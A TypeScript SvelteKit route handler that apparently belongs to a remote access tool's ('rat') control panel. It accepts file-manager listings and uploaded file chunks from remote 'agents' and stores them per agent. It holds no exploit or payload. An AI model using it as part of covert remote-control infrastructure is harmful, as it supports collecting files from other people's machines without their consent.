import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { fileManagerStore, FileManagerError } from '$lib/server/rat/file-manager';
import type { FileManagerResource } from '$lib/types/file-manager';

interface FileManagerStatePayload {
	resource?: FileManagerResource;
	resources?: FileManagerResource[];
	clear?: boolean;
}

function collectResources(payload: FileManagerStatePayload): FileManagerResource[] {
	const items: FileManagerResource[] = [];
	if (payload.resource) {
		items.push(payload.resource);
	}
	if (payload.resources?.length) {
		items.push(...payload.resources);
	}
	return items;
}

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const contentType = request.headers.get('content-type') ?? '';

	if (contentType.toLowerCase().includes('multipart/form-data')) {
		const formData = await request.formData();
		const metadata = formData.get('metadata');
		if (typeof metadata !== 'string') {
			throw error(400, 'File manager metadata part is required');
		}

		let payload: FileManagerStatePayload;
		try {
			payload = JSON.parse(metadata) as FileManagerStatePayload;
		} catch {
			throw error(400, 'Invalid file manager payload');
		}

		if (!payload || typeof payload !== 'object') {
			throw error(400, 'File manager payload must be an object');
		}

		if (payload.clear) {
			fileManagerStore.clearAgent(id);
		}

		const resources = collectResources(payload);
		if (resources.length === 0) {
			return json({ accepted: true, ingested: 0 });
		}

		const packages = await Promise.all(
			resources.map(async (resource) => {
				if (resource.type === 'file' && resource.stream) {
					const part = formData.get(resource.stream.part);
					if (!part || typeof (part as Blob).arrayBuffer !== 'function') {
						throw error(400, `Missing file stream chunk: ${resource.stream.part}`);
					}
					const arrayBuffer = await (part as Blob).arrayBuffer();
					return { resource, chunk: Buffer.from(arrayBuffer) };
				}
				return { resource };
			})
		);

		try {
			const ingested = fileManagerStore.ingestResources(id, packages);
			return json({ accepted: true, ingested: ingested.length });
		} catch (err) {
			if (err instanceof FileManagerError) {
				throw error(err.status, err.message);
			}
			throw error(500, 'Failed to ingest file manager resources');
		}
	}

	let payload: FileManagerStatePayload;
	try {
		payload = (await request.json()) as FileManagerStatePayload;
	} catch {
		throw error(400, 'Invalid file manager payload');
	}

	if (!payload || typeof payload !== 'object') {
		throw error(400, 'File manager payload must be an object');
	}

	if (payload.clear) {
		fileManagerStore.clearAgent(id);
	}

	const items = collectResources(payload);

	if (items.length === 0) {
		return json({ accepted: true, ingested: 0 });
	}

	try {
		const ingested = fileManagerStore.ingestResources(
			id,
			items.map((resource) => ({ resource }))
		);
		return json({ accepted: true, ingested: ingested.length });
	} catch (err) {
		if (err instanceof FileManagerError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to ingest file manager resources');
	}
};
